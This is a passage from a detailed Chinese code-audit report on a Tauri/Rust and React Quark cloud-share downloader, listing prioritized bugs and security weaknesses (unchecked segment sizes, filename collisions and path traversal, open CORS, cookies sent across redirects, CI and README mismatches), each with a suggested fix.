**诚实标注的边界**：本机无 Rust 工具链，我**没有实机复现**这条链；"远程来源能绕过 ACL 调用自定义命令"这一半是上游 CHANGELOG 的明文自述（2.11.1 之前的已知缺陷），"能被导航到远程页面"这一半来自 `on_navigation` 的代码，两者都是确定的，只是"如何触发那次导航"需要实机确认。

**修复（成本极低，务必先做）**
- 把 `tauri` 升到 **≥ 2.11.1**（`Cargo.lock` 一并更新）；
- 若确实需要自定义命令，补 `AppManifest`（`tauri_build::Attributes::new().app_manifest(AppManifest::new().commands(&["download_file", "cancel_downloads"]))`）；
- `on_navigation` 改成来源白名单（只允许 `tauri://localhost` / `http://tauri.localhost` / dev server），其余 `false` 并交给系统浏览器打开；
- `download_file` 里对 `url` 做主机白名单（夸克 CDN 域）、对 `filename` 只保留 basename。

---

## 一、P0：会造成数据损坏或明显错误结果

### 1. 分片下载不校验实际字节数 —— 文件损坏却报告"成功 + 100%"

`src-tauri/src/main.rs:457-491`（`download_segment`）

```rust
    loop {
        if is_cancelled(epoch) { return Err("下载已取消".into()); }
        match resp.chunk().await {
            Ok(Some(chunk)) => { /* 写入 + 累加 seg_downloaded */ }
            Ok(None) => break,          // ← 提前 EOF 也当作正常结束
            Err(e) => { return Err(...); }
        }
    }
    writer.flush().await...;
    println!("[download] 段{} 完成: {}/{} bytes", index, seg_downloaded, expected);
    Ok(())                              // ← 从不比较 seg_downloaded 与 expected
```

- `expected = end - start + 1` 被算出来只用于打印，**没有任何校验**：
  - 分片**少收**（服务端提前干净关闭连接 → `Ok(None)`）：接受为成功；
  - 分片**多收**（服务端忽略 Range 却回 206，把整个文件发下来）：同样接受。
- 合并阶段 `main.rs:375-395` 只是按序 `tokio::io::copy` 各 chunk，因此最终文件长度 = 各分片实际字节数之和，可能小于或大于 `total_size`。
- 返回值 `main.rs:413-416` 写的是 `"size": total_size`（来自 Content-Length），**不是实际写入字节数**；`main.rs:402-411` 还会发出一条 `status: "done"` 事件 → 前端显示 100% 完成。

**后果**：下载大文件时可能得到静默损坏的文件（视频花屏/无法播放、压缩包 CRC 错误），而 UI 报告"已保存到 …"。
**修复**：循环结束后校验 `seg_downloaded == expected` 与 `Content-Range`，不一致即 `Err`；合并完成后校验最终文件长度，并把实际长度返回给前端。

> **已用等价模拟验证**（按 `main.rs:253-264/420-491` 的分片与循环逻辑 1:1 复刻）：10 MB + 1 字节的文件、999 分片、其中第 500 片只传了 60% 后干净 EOF —— 999/999 个分片全部返回 `Ok(())`，**没有任何错误被抛出**，合并出的文件比真实大小**少 4,199 字节**，而返回给前端的 `size` 仍是 `10485761`、进度显示 100% 完成。
>
> **该模拟的边界（补充复核后修正）**：模拟复刻的是"缺少校验"这一逻辑漏洞，不代表线上一定会以"干净 EOF"的形式出现 —— 当 206 响应带 `Content-Length` 而连接提前中断时，hyper 会报 `IncompleteMessage`（"connection closed before message completed"），此时 `main.rs:471-476` 会转成 `Err`，反而是**失败**而非静默损坏。因此真正的静默损坏路径是另外两类，而且比截断更糟：①分片按 chunked/连接关闭定界（非 `Content-Length` 定界）时提前结束；②`main.rs:439-446` **只校验状态码 206、从不校验 `Content-Range`**，且 999 个分片之间没有 `ETag`/`If-Range`/`Last-Modified` 一致性校验 —— 服务端返回了别的区间、或 CDN 中途换了对象版本，合并出来就是**错位/混版本**的文件，而进度与返回值依旧宣称 100% 成功。

同样的缺失出现在单线程路径：`main.rs:549`（`Ok(None) => break`）后不比较 `downloaded` 与 `total_size`，`main.rs:562-567` 仍打印"单线程完成"。这条的杀伤力略小（返回的 `size` 是真实字节数，且中途出错会删掉半成品，`main.rs:550-553`），性质是"文件不可验证 + 假的 100% 完成"，而不是尺寸报错。

### 2. 同名文件并发下载会互相覆盖（TOCTOU 竞态）

`src-tauri/src/main.rs:90-118`

```rust
fn resolve_save_path(downloads_dir: &PathBuf, filename: &str) -> PathBuf {
    let mut save_path = downloads_dir.join(filename);
    if !save_path.exists() { return save_path; }   // ← 先检查
    ...
```

`main.rs:139-141`（在命令入口同步调用，此时文件还不存在）

```rust
    let downloads_dir = dirs::download_dir().unwrap_or_else(|| PathBuf::from("."));
    let save_path = resolve_save_path(&downloads_dir, &filename);
```

前端 `frontend/src/features/download/DownloadManager.tsx:114,171` 默认 **5 个文件并发**，且传给 Rust 的只有 `f.file_name`（`ShareParser.tsx:87-98` 算出的唯一 `node.path` 从未被使用）：

```ts
const concurrency = Math.min(downloadConcurrency, total);
...
await triggerDownload(dl.data[0].download_url, f.file_name);
```

**后果**：分享内不同子目录下的同名文件（`a/1.mp4` 与 `b/1.mp4`，"全选"时非常常见）会解析到**同一个绝对路径**，两个任务同时 `File::create` 同一路径（`main.rs:376` / `main.rs:504`）→ 互相截断/交叉写入，两个都报告成功。属于必现级数据丢失风险。额外后果：此时取消其中一个任务，`main.rs:516` / `main.rs:551` 的 `remove_file(&save_path)` 会把**另一个仍在跑的任务的文件删掉**。
**修复**：把路径解析移到实际创建文件时并用原子创建（`OpenOptions::create_new`）+ 冲突重试，或由前端传入唯一相对路径（`node.path`）并做目录还原。

### 3. 文件名未做任何清洗（可写出下载目录之外）

`main.rs:91` `downloads_dir.join(filename)`：`filename` 来自远端分享列表，未过滤 `..`、路径分隔符、绝对路径（Windows 上 `PathBuf::join` 遇到绝对路径会**整体替换**）、保留名（`CON`/`NUL`）。
**后果**：恶意/异常分享的文件名可让程序写到任意路径（如启动目录）。
**修复**：取 `Path::file_name()` 后仅保留基础名，拒绝 `.`/`..`，并校验 `save_path` 的父目录仍是下载目录。

### 4. 批量任务"全部失败"仍然提示"全部完成"

`frontend/src/features/download/DownloadManager.tsx:175-199`

```ts
                } catch (error: unknown) {
                    const message = getErrorMessage(error);
                    addLog(`  处理出错: ${message}`, 'error');   // 只写日志，不重抛
                } finally {
                    done += 1;                                   // 失败/跳过也计入完成
                    ...
                }
...
            await Promise.all(Array.from({ length: concurrency }, () => worker()));
            setProgress(total, total, '全部完成');
            addLog(`全部完成，共处理 ${total} 个文件`, 'success');
            notify(`全部完成，共处理 ${total} 个文件`, 'success');   // 无条件成功提示
```

而 `addLog` 写进去的 `logs` **没有任何组件渲染**（全项目 grep 只有 store 里的声明与写入，见 `frontend/src/store/useQuarkStore.ts:43,99,138,206`），`shareInfo.status` / `statusType`（`ShareParser.tsx:115,145,159,176,183`）同样只写不读。

**后果**：转存失败、stoken 过期、网盘空间不足等情况下，用户看不到任何逐文件原因，进度条走到 100%，弹出绿色"全部完成"——实际一个文件都没下下来。
**修复**：统计成功/失败数，失败数 > 0 时给出 warning/error 汇总；把 `logs` 渲染出来（或至少汇总最后一条错误）。

### 5. 默认线程数是 **999**，README 却写 128 / 32

`frontend/src/store/useQuarkStore.ts:108`

```ts
    downloadThreads: Number(localStorage.getItem('download_threads')) || 999,
```

`frontend/src/components/Sidebar.tsx:91-105`（数字框上限 999，滑块上限 128，同一个值 → 首次拖拽会静默把 999 改成 ≤128）
`src-tauri/src/main.rs:138` `thread_count.unwrap_or(999).max(1).min(999)`
`README.md:29` "Rust 原生 **128 线程**并行下载引擎"、`README.md:65` "reqwest · **32 线程**分片"

**后果**：一个 10 MB 文件会被切成 **999 个约 10 KB 的分片**（999 个临时文件、999 个 Range 请求），默认 5 文件并发 → 峰值约 5000 个在途请求/连接。除了巨大开销外，极易触发 CDN 反滥用（正好与 README 里"绕过 23018 错误"的目标相反）。
**修复**：默认值降到 8~32，并统一 README、滑块、数字框、Rust 的语义（建议按"每文件分片数"命名，上限 64，且不低于 `total_size / 4MB`）。

---

## 二、P1：功能缺失与关键路径缺陷

### 6. UI 里根本没有"取消"按钮（README 承诺了）

`README.md:29`："实时速度与进度反馈，**支持一键取消**"。
实际全项目只有两处调用 `cancel_downloads`：`frontend/src/App.tsx:27`（挂载时清理残留）与 `App.tsx:30`（`beforeunload`）。`DownloadManager` 只渲染"开始任务"（`DownloadManager.tsx:267-279`）。Rust 侧的 epoch 取消机制（`main.rs:16-21,123-128`）是完整可用的，只是没有入口。
**后果**：用户唯一的停止方式是关掉整个程序；而 `beforeunload` 在 Tauri 窗口关闭时是否触发并未验证（`TitleBar.tsx:112` 走的是 `appWindow.close()`）。

### 7. 进度监听挂在"条件渲染"的组件里 —— 取消勾选后进度永久冻结

`frontend/src/features/share-parse/ShareParser.tsx:33-37,322-337`

```ts
const shouldShowActionBar = isParsed && selectedFids.size > 0;
const isPanelOpen = isActionBarVisible || shouldShowActionBar;
...
{isPanelOpen && (<motion.div ...><DownloadManager /></motion.div>)}
```

`DownloadManager` 内的 `listen('download-progress')`（`DownloadManager.tsx:43-65`）是**唯一**调用 `updateDownload` 的地方。
**触发路径**：下载中点"全选"取消全选（`DownloadManager.tsx:67-73`，该按钮在下载中未禁用）→ `selectedFids` 清空 → `shouldShowActionBar` 为 false → 面板卸载 → 监听器被移除。
**后果**：Rust 仍在下载并持续 emit，但全局进度岛（`MainLayout.tsx:50-70`）停在上一次的百分比且**永远不会被清理**（唯一的清理是 `App.tsx:28` 的挂载时 `clearAllDownloads()`），直到重启应用。
**修复**：把 `listen` 移到 `App`/`MainLayout` 层级，或在 store 中集中订阅。

### 8. 容量请求失败后 `capacity.loading` 永久为 true

`frontend/src/App.tsx:36-48` 与 `frontend/src/components/MainLayout.tsx:75-87`

```ts
    setCapacityLoading(true);
    try {
        const res = await quarkApi.getMemberInfo();
        if (res.status === 200 || res.code === 0) { ... setCapacity(...) }
    } catch (e) { console.error('Failed to fetch capacity', e); }   // ← 没有 finally
```

`setCapacityLoading(false)` 全项目从未被调用；清标志的唯一位置是 `useQuarkStore.ts:115` 的 `setCapacity`。
**后果**：一次失败（后端未起、Cookie 失效、502）之后，侧边栏的刷新按钮永久禁用、`RefreshCw` 永久旋转，且无提示，只能重启。

### 9. 内置服务端口硬编码 3000，且绑定失败是 `expect` 崩溃

`src-tauri/src/main.rs:621-635`

```rust
            let port: u16 = std::env::var("PORT").ok().and_then(|s| s.parse().ok()).unwrap_or(3000);
            tauri::async_runtime::spawn(async move {
                let listener = tokio::net::TcpListener::bind(format!("127.0.0.1:{}", port))
                    .await
                    .expect("failed to bind API server port");
```

前端也硬编码同一地址：`frontend/src/services/http.ts:4-6` `baseURL: import.meta.env.VITE_API_BASE_URL || 'http://127.0.0.1:3000/api'`。
**后果**：3000 端口被占用（很常见）时，窗口正常打开但所有功能报"网络连接失败"，无任何提示。更糟的是 `PORT` 环境变量是个**半成品开关**：设了 `PORT=4000` 后后端改听 4000，而前端仍旧请求 3000，必然全盘失效。
**修复**：端口 0（系统分配）后通过 `app.emit`/初始化脚本把实际端口传给前端，或至少捕获绑定失败并弹窗。

### 10. 代理层每次请求都新建 HTTP 客户端 + 目录递归串行

`src-tauri/src/quark_client.rs:33-39,57`

```rust
fn build_client() -> Client {
    Client::builder().redirect(redirect::Policy::none()).danger_accept_invalid_certs(false)
        .build().expect("failed to build HTTP client")     // ← 每请求都建，且失败即 panic
}
```

`build_client()` 在 `proxy_request`（`:57`）和 `fetch_with_cookies`（`:109`）里各调一次 → **每个 API 调用都是全新的连接池**，无法复用 TCP/TLS 会话（每次都要重新握手）。
`frontend/src/features/share-parse/ShareParser.tsx:74-109` 的 `getFileTreeRecursive` 又是**严格串行**的逐目录递归（每个子目录一次 `await`）。
**后果**：几百个目录的分享 = 几百次串行的"新 TLS 握手 + 请求"，解析耗时以分钟计。
**修复**：用 `OnceLock` 静态复用 Client；请求加超时；目录并发度用 `futures::stream::buffer_unordered` 限制在 4~8。

### 11. 全项目没有任何请求超时

grep 结果：只有 `main.rs:31` 的 `connect_timeout(30s)`。
`quark_client.rs` **完全没有** timeout（连接与读取都没有），下载引擎里 `resp.chunk().await`（`main.rs:461,519`）也没有读超时。
**后果**：上游卡住时请求/下载无限期挂起；配合"没有取消按钮"（第 6 条），一个卡死的下载会永久占用 1~10 个并发槽位，用户只能重启程序。

### 12. `x-cookie` 校验失败会删掉原本可用的登录态

`frontend/src/features/auth/AuthModal.tsx:111-132`

```ts
            setCookie(trimmed);                       // ← 先无条件写入（落 localStorage）
            const res = await quarkApi.getMemberInfo();
            if (res.status === 200 || res.code === 0) { ... } else {
                setCookie('');                        // ← 覆盖后直接清空
                notify('Cookie 无效，请检查后重新输入', 'error');
            }
        } catch {
            setCookie('');                            // ← 网络抖动也当作凭据无效
```

**后果**：已登录用户粘贴一段错 Cookie（或被网络错误打断）→ 原有的可用会话被永久破坏，必须重新扫码。
**修复**：校验通过后再写入；失败时恢复原值。

同样语义问题：`AuthModal.tsx:134-142` 的"重置"按钮会调用 `onLogout()` → `MainLayout.tsx:89-126` 的远端注销流程，标签与行为不符。

### 13. 内置 API 服务对任意网页开放（CORS 全开 + `csp: null`）

`src-tauri/src/api_server.rs:16-20`

```rust
    let cors = CorsLayer::new().allow_origin(Any).allow_methods(Any).allow_headers(Any)
        .expose_headers([header::HeaderName::from_static("x-append-cookie")]);
```

`src-tauri/tauri.conf.json:15` `"csp": null`。
**影响评估**（经独立复核后收窄）：Cookie 由调用方通过 `x-cookie` 自行提供，夸克会话存在 Tauri WebView 的 `localStorage`（另一个 origin），且没有任何路由会把调用方的 Cookie 回传，所以浏览器网页**拿不到**用户凭据。真实危害是：①**本机任意进程**都能零认证地使用这个夸克代理（`/api/qrlogin/*` 甚至不需要 Cookie），可被用来爆破分享口令（`/api/share/token`）、轮询任务状态，且没有任何速率限制；②网页向量部分受浏览器 Local Network Access/PNA 限制（Chrome/Edge 要求预检响应带 `Access-Control-Allow-Private-Network: true`，而 tower-http 的 `CorsLayer` 不会发这个头）—— 但这是**你不掌控的、随浏览器版本变化的**缓解，不能当安全边界；③`csp: null` + `shell:allow-spawn` 权限（见第 14 条）意味着一旦出现任何注入点，后果会放大。
**修复**：CORS 白名单（`tauri://localhost` / `http://tauri.localhost`），配置 CSP。

### 14. 声明并授权了 `tauri-plugin-shell`，但全项目没有使用

`src-tauri/src/main.rs:590` `.plugin(tauri_plugin_shell::init())`、`capabilities/default.json:16-17` `"shell:allow-spawn"`, `"shell:allow-kill"`，`Cargo.toml:14` `tauri-plugin-shell = "2"`。
前端依赖里没有 `@tauri-apps/plugin-shell`，Rust 里也没有任何 `ShellExt` 调用。
**后果**：多出一个"前端可 spawn/kill 进程"的权限面。**注意不要夸大**：`shell:*` 是**插件**权限，走 ACL 检查，且 `capabilities/default.json` 只声明了 `"windows": ["main"]`（`gen/schemas/capabilities.json` 中 `local: true`、无 `remote` 项），所以远程来源在任何 Tauri 版本上都够不到它 —— 属于"清理爆炸半径"的卫生问题，不是可直接利用的漏洞（与第 0 节的自定义命令 ACL 缺陷不同）。

### 15. `npm run tauri:build:<target>` 的 `--target` 传错位置（交叉编译/universal 不可用）

`package.json:12-16` 例如：

```json
"tauri:build:win-arm64": "npm --prefix frontend exec -- tauri build -- --target aarch64-pc-windows-msvc",
```

实测 `npm exec` **不会**吃掉第二个 `--`（用打印 argv 的脚本验证，收到 `["build","--","--target","aarch64-pc-windows-msvc"]`）。而 Tauri CLI 源码（`crates/tauri-cli/src/build.rs`）里：

```rust
  #[clap(short, long)]
  pub target: Option<String>,      // 真正的 --target
  ...
  /// Command line arguments passed to the runner. Use `--` to explicitly mark the start of the arguments.
  pub args: Vec<String>,           // -- 之后的都进这里
```

所以 `--` 之后的三元组被当成 **runner(cargo) 参数**，`options.target` 仍是 `None` → 打包阶段回退 `Target::current()`（宿主平台）。
**后果**：`tauri:build:mac-universal`（`README.md:119`）**必然失败**——`universal-apple-darwin` 是 Tauri 的伪三元组，cargo 不认识。其余交叉编译脚本（`win-arm64`、`mac-x64` 等）因为 cargo 自己认识 `--target`，**可能看起来能编过**，但 Tauri 侧的 `Target::current()`（宿主）仍决定打包/产物定位，属于"时好时坏的隐蔽错误"，比直接报错更难排查。
（CI 用的是 tauri-action 的 `args: --target …`，是正确写法，不受影响。）
**修复**：去掉第二个 `--`（或改用 `-t`）：`"tauri:build:win-arm64": "npm --prefix frontend exec -- tauri build -t aarch64-pc-windows-msvc"`。

---

## 三、P2：中等 / 体验 / 交互缺陷

| # | 问题 | 位置与证据 | 后果 |
|---|---|---|---|
| 16 | 扫码轮询 interval 被反复重建 | `MainLayout.tsx:263` 传内联 `onClose={() => …}` → `AuthModal.tsx:29-32,70,87,107` 依赖链 `[qrStatus, qrToken, completeQrLogin]`；`MainLayout` 订阅整个 store，下载期间每 500ms 一次 `updateDownload` 就会重建 effect | 有下载在跑时，2s 轮询可能永远不到期，扫码后卡在"请使用夸克 APP 扫描二维码" |
| 17 | 解析可重入 | `ShareParser.tsx:111-120` 无 `loading` 守卫；`:224` `onKeyDown` 的 Enter 路径绕过了按钮的 `disabled` | 连按两次 Enter → 两个解析树并发，`resetShareInfo()` 把前一次结果清掉，最后完成的覆盖显示 |
| 18 | 解析状态与日志完全没有 UI | `logs`（`useQuarkStore.ts:43`）与 `shareInfo.status`（`ShareParser.tsx:115,145,159,176,183`）只写不读 | 解析进度/失败原因只剩一个 3 秒 toast；`logs` 还无上限增长（每文件约 6 条，永不清理） |
| 19 | `x-append-cookie` 只在首次生效 | `http.ts:18-28` `if (!currentCookie.includes('__puus='))`；Rust 只在 `__puus` **轮换**时才回这个头（`api_server.rs:162-185`） | 会话中途 `__puus` 刷新后再也不更新，后续请求用过期 nonce（表现为"登录状态已失效"但 `isLoggedIn` 仍为 true）。另：`quark_client.rs:138-142` 累积 Set-Cookie 时不去重、不处理过期，`qr_get_cookie`（`:335-341`、`:359-363`）用裸 `join` 而不是已有的 `build_cookie_header`（`:164-178`），所以存进 localStorage 的登录 Cookie 本身就可能带重复/过期的 `__puus`/`__uid` |
| 20 | 只用 `>= 400` 判失败 | `main.rs:186-194` | 3xx（无 Location）或 204 等会被当成正常 body，创建 0 字节文件并报"成功" |
| 21 | `notify()` 连写两次 store | `useQuarkStore.ts:154-158`：第 2 次 `set` 丢掉了 `isLoggingOut` | 退出登录期间任何 toast 都会让"退出登录"按钮提前恢复可点，可重复触发注销；同时每次 notify 双渲染 |
| 22 | 3 秒延时重置进度未保存句柄 | `DownloadManager.tsx:190-194` | 上一批结束后 3 秒内开始下一批，进度会被重置为 0/0，进度岛中途消失 |
| 23 | 面板开关按钮在选中文件后无效 | `ShareParser.tsx:37,282`（`isPanelOpen = isActionBarVisible \|\| shouldShowActionBar`） | 只要还有勾选，点击只换图标不改变面板；需要点两次 |
| 24 | `FileTree` 直接改 store 对象 | `FileTree.tsx:120-125` `node.expanded = !node.expanded` | 绕过 zustand 变更通知，靠"订阅整个 store + 强制重渲染"侥幸生效，任何记忆化/selector 化都会坏 |
| 25 | QR 登录丢弃 `missing_puus` | `AuthModal.tsx:72-77` 只用 `res.cookie`；Rust 明确返回该标志（`quark_client.rs:373-384`） | 后端已知 Cookie 不完整（下载会受限）时仍提示"登录成功，欢迎回来" |
| 26 | 外部链接可能无效 | `HelpView.tsx:109-118,127-134`、`AuthModal.tsx:271` 用 `target="_blank"`，但项目未引入 opener 插件、无 `shell:allow-open` | 点击 GitHub / pan.quark.cn 链接大概率没有任何反应（**未实机验证**）。补充修正：`target="_blank"` 走的是"新窗口"路径，**不经过** `on_navigation`，所以这两件事没有因果关系；`on_navigation` 的真正风险是"对任意 URL 一律放行、没有来源白名单"，已上升为第 0 节的 C1 |
| 27 | `can_read_account_info` 有死代码 | `quark_client.rs:292-302`：算完 `msg`、判完关键字后无条件 `return false` | 消息级判断从未生效，函数语义与注释不符 |
| 28 | `x-append-cookie` 重复 push，且"最后者胜" | `api_server.rs:162-185`：先 `headers.get("set-cookie")` 判一次，又 `get_all` 循环判一次；`api_server.rs:189-193` 用 `HeaderMap::insert` | 重复不会上线（`insert` 会清掉同名的旧值，线上只有 1 个 `x-append-cookie`），但**同名不同值会静默取最后一个**：若最后一项是删除型 Cookie（`__puus=; Max-Age=0`，同样以 `__puus=` 开头），空值就成"胜者"，而 `http.ts:22` 的"只追加一次"规则会把这个坏值**永久锁死**（只能重新登录）。另外 `162-173` 与 `175-185` 完全重复，唯一独有效果是那行日志 |
| 29 | 侧边栏文案错字 | `Sidebar.tsx:139` `'正在提出...'` | 应为"正在退出…" |
| 30 | `resolve_save_path` 的整除假设是隐雷 | `main.rs:253-264`：`segment_size = total_size / thread_count`，若 `thread_count > total_size` 则 `(i+1)*0 - 1` 下溢 | 当前 `MIN_MULTITHREAD_SIZE=10MB` + 上限 999 使其**不可达**，但一改这两个常量就会 panic（debug）/ 回绕（release） |
| 31 | **按字节截断 UTF-8 错误文本会 panic** | `main.rs:186-194`：`let err = resp.text().await.unwrap_or_default(); ... &err[..err.len().min(200)]` | 上游返回中文错误页时，第 200 字节很可能落在 3 字节字符中间 → `byte index 200 is not a char boundary` panic。panic 发生在 `tokio::spawn` 的任务里、且在 `tx.send()` 之前，于是 `main.rs:155-158` 只能返回"下载任务异常终止"，真正的 CDN 错误信息丢失。应改用 `err.chars().take(200).collect::<String>()` |
| 32 | 代理失败是 panic 而不是 5xx | `quark_client.rs:38` `.expect("failed to build HTTP client")`（TLS 后端初始化失败即 panic）；`main.rs:634` `axum::serve(...).expect("API server error")` | TLS 初始化异常时 axum 处理函数直接 panic，前端拿到连接错误而不是 JSON 错误；API 服务意外退出时也没有任何提示 |
| 33 | **会话 Cookie 被发往重定向链上的每一个主机** | `main.rs:39-47` 的 `add_headers` 无条件附带 `Cookie`；`main.rs:50-87` 的手动重定向循环在**每一次跳转**都重新附上（`main.rs:63`），且没有主机白名单 | 只要 CDN 的 `Location` 链上出现任何第三方主机，用户的**完整夸克会话 Cookie**（网盘全权限）就会被送到那里。应在跨主机跳转时剥离 Cookie，或只对 `*.quark.cn` 放行 |
| 34 | 写盘/flush 失败时不删除半成品 | `main.rs:521-524`、`main.rs:557-560` 直接 `return Err`，而中途传输错误（`main.rs:550-553`）和取消路径（`main.rs:515-517`）都会 `remove_file` | 最终文件名下留下一个截断文件，和正常下载**无法区分**，用户可能当成完整文件使用 |
| 35 | 合并失败会泄漏半成品 + 整个临时目录 | `main.rs:376-395` 的 `File::create`/打开分片/`copy`/`flush` 全部用 `?` 提前返回，跳过了 `main.rs:398` 的清理（`main.rs:351` 的清理只覆盖分片错误） | 用户"下载"目录里留下半个最终文件 + `.quark_temp_*` 目录（最多 999 个分片，约等于整个文件大小）；Windows 上点号前缀不是隐藏属性，且崩溃残留永不清理 |
| 36 | 合并阶段没有取消检查 | `main.rs:357-360` 只在合并**前**检查一次；合并后直接 `main.rs:402-416` 发 `done` 并返回 | 大文件合并期间取消会被忽略，任务仍报成功 100% |
| 37 | 完全没有重试 | `main.rs:340-354`：任一分片失败就把整个文件判失败并删除全部已完成分片 | 999 分片的大文件只要有一片瞬时抖动，就要从头再来；且 `main.rs:340-346` 会等所有分片都结束才处理错误，浪费时间与带宽 |
| 38 | 下载目录回退到进程 CWD | `main.rs:139` `dirs::download_dir().unwrap_or_else(|| PathBuf::from("."))` | 取不到系统下载目录时静默写进进程当前目录（打包后不可预测、可能不可写），用户找不到文件 |
| 39 | `POST /api/logout` 用 200 表示失败 | `api_server.rs:110-116` 恒返回 200；`quark_client.rs:441-454` 把 `ok:false` 放在 body 里 | 三种失败形态共用一个状态码，调用方只能靠 body 分支，容易误判为成功 |

---

## 四、P3：工程卫生与文档

1. **`.gitignore` 是 0 字节，且仓库至今 0 次提交、也没有 remote** —— `git check-ignore` 对 `frontend/node_modules`、`frontend/dist`、`src-tauri/target` 全部无输出。现在执行 `git add -A` 会提交 **12,181 个文件 / 186.5 MB**，其中 `node_modules` 12,113 个文件 / 154.5 MB、`dist` 15.7 MB、`src-tauri/gen` 0.33 MB（tauri-build 生成物）。而且这份 `node_modules` 是 **Windows 专用**安装（`@esbuild/win32-x64`、`@rollup/rollup-win32-x64-msvc`、`@tauri-apps/cli-win32-x64-msvc`），一旦提交会直接破坏 macOS 的 CI 任务。必须先补 `.gitignore`（`node_modules/`、`dist/`、`target/`、`src-tauri/gen/schemas/`、`.env*`、`*.local`）。同时 `release.yml:5-6` 只在 `push: tags: ['v*']` 时触发，而现在既无提交也无 tag，`actions/checkout@v4` 无内容可取 —— 工作流目前**不可能跑起来**。
2. **`npm run lint` 失败**（实测 exit 1，3 个 error）：
   - `components/ui/badge.tsx:39`、`components/ui/button.tsx:58`：`react-refresh/only-export-components`（同时导出 `badgeVariants`/`buttonVariants`）；
   - `components/ui/input.tsx:4`：`@typescript-eslint/no-empty-object-type`（`export interface InputProps extends React.InputHTMLAttributes<HTMLInputElement> { }`）；
   - 另有 `ShareParser.tsx:203` 一条 `react-hooks/exhaustive-deps` 警告。
   规则来自 `eslint.config.js` 的 `tseslint.configs.recommended` + `reactRefresh.configs.vite`，属真实违规。README `:276` 却把 lint 写进开发规范，CI 里也没有 lint 步骤。
3. **字体占 15.9 MB，其中 14.3 MB 实际用不到**：`frontend/public/fonts/SourceHanSansSC-VF.otf.woff2` = 14,270,432 B、`Noto Sans SC.woff2` = 1,595,056 B，二者在 `index.css:25-26` 的同一个 font-family 栈里前后排列（`"Noto Sans SC Local"` 在前），后者几乎永远不会被下载/使用，却会随 `frontendDist` 一起被打进二进制（当前 `frontend/dist` = 15.7 MB）。建议只保留其一并做子集化（subset）。
4. **前端产物 557 KB 单 chunk**：`vite build` 报 `Some chunks are larger than 500 kB`（`dist/assets/index-*.js` 557.06 kB / gzip 178.81 kB），可用 `manualChunks` 拆分 framer-motion / radix 等。
5. **图标资源不标准**：`src-tauri/icons/` 只有 `icon.ico`(175 KB，含 16/32/48/128/256 层，Tauri 要求 16/24/32/48/64/256，缺 24 与 64) 与 `icon.png`(116 KB，实为 **256×256**)，`tauri.conf.json` 的 `bundle.icon` 也只列这两个。Tauri v2 会用 PNG 现造 `.icns`（`create_icns_file`：`crates/tauri-bundler/src/bundle/macos/icon.rs`），所以 macOS 打包**不会失败**，但只会生成 256px 一层（`ic08`），Retina 下 Dock/Finder 图标会糊；也缺 `32x32.png`/`128x128.png`/`128x128@2x.png`。建议直接跑 `tauri icon`。
6. **README 与实现不一致**：
   - `:29` "128 线程" / `:65` "32 线程分片" / 代码实际默认 **999**（第 5 条）；
   - `:29` "支持一键取消" —— 无此 UI（第 6 条）；
   - `:17` 下载链接指向 `releases/tag/main`：因为 `release.yml` 支持 `workflow_dispatch`，而 `tagName: ${{ github.ref_name }}` 在手动触发时是分支名（`main`），会创建一个以分支名为 tag 的 release —— 语义错误，建议手动触发时要求输入 tag 或改用 `tag_name` 校验；
   - `:86` `git clone https://github.com/YOUR_USERNAME/quark-downloader-pro.git` 仍是占位符，实际仓库是 `OP404OP/quarkdownloaderpro`；
   - `frontend/README.md:10` 让用户 `cp .env.example .env.local`，但仓库里**没有** `.env.example`；`:15` 说 `VITE_API_BASE_URL` "留空时走相对路径 `/api`"，而 `http.ts:5` 用的是 `|| 'http://127.0.0.1:3000/api'`，空值会回退到绝对地址 —— 于是 `vite.config.ts:12-17` 的 `/api` 代理在开发中**永远不会被用到**（该配置是死代码，且代理目标是 `http://localhost:3000`，与后端绑定的 `127.0.0.1` 在 IPv6 优先的环境下还可能连不上）。
7. **死代码/未使用资源**：`frontend/src/App.css`（606 B，从未被 import）、`frontend/src/assets/react.svg`（模板残留）、`quark_client.rs:314` 塞进响应体的 `_request_id` 前端从不读取、`quark_client.rs:189-194` 的 `AccountInfo.is_logged_in` 与 `:98-102` 的 `CookieResponse.status`（写后从不读）、`main.rs:10` 的 `Manager` 导入（未使用）、`api_server.rs:137-140` 的 `axum::http::Method::POST => Method::POST` 分支（不可达：GET 注册的路由在 axum 层就 405 了，POST 注册的路由上游本来就是 POST）、`api_server.rs:127` 每个请求都重建 7 项路由 `HashMap`（7 次 String 分配，应改静态表）、`tauri-plugin-shell`（第 14 条）、`vite.config.ts` 代理（上一条）。
8. **无任何测试**：仓库没有测试文件，`package.json` 也没有 `test` 脚本；`Cargo.toml` 无 dev-dependencies。对"分片下载 + 合并"这种最需要回归保护的逻辑，建议至少加 Rust 单元测试（分片区间计算、`resolve_save_path`、截断/超长分片的拒绝）。
9. `main.rs:1-2` `#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]` + 全程 `println!` 调试输出：release 下没有控制台，出问题时用户无法提供任何日志。建议改用 `tauri-plugin-log` 写文件。
10. **打包目标与宣传不符**：`tauri.conf.json:20` `"targets": "all"` → Windows 上会额外产出 MSI + NSIS 安装包，而 `README.md:17` 强调"无需安装，双击即用"，`:114-127` 也只记录了便携 exe 的路径。另外 `release.yml` 完全没有 macOS 签名/公证相关变量（无 `APPLE_CERTIFICATE`/`APPLE_ID`/`APPLE_TEAM_ID`），产出的 `.dmg` 未签名，用户双击会被 Gatekeeper 拦下 —— 与"双击即用"的承诺冲突。
11. **文档里的 Rust 版本要求过低**：`README.md:76` 写 `Rust >= 1.70`，但 `Cargo.lock` 锁定的 tauri 2.10.2 其 `rust-version = "1.77.2"`。照 README 装 1.70~1.77 的开发者直接编译失败（CI 用 `dtolnay/rust-toolchain@stable`，不受影响）。两个 `package.json` 也都没有 `engines` 字段，`README.md:75` 的 "Node.js >= 18.x" 同样无人约束。
12. **CI 的 macOS x64 任务实际跑在 ARM64 runner 上**：`release.yml:25-27` 用 `macos-15`（GitHub 上是 arm64）配 `target: x86_64-apple-darwin`，属于交叉编译而非原生 Intel 构建；若要原生 x64 应使用 `macos-15-intel`。此外 CI 只覆盖 3 个目标（windows-x64、macos-arm64、macos-x64），而 `README.md:35` 与 `package.json` 宣称支持 5 个（缺 Windows ARM64 与 macOS Universal）。
13. **CI 步骤可确定性问题**：`release.yml:59-60` 在 `npm --prefix frontend ci` 之后又跑 `npm --prefix frontend install @tauri-apps/cli`，而该包已在 `frontend/package.json:36` 锁定（`^2.2.5` → 2.10.0）；`npm install` 可能拉到更新的 2.x 并改写 lockfile，导致同样的 tag 每次构建出的 CLI 版本不同。
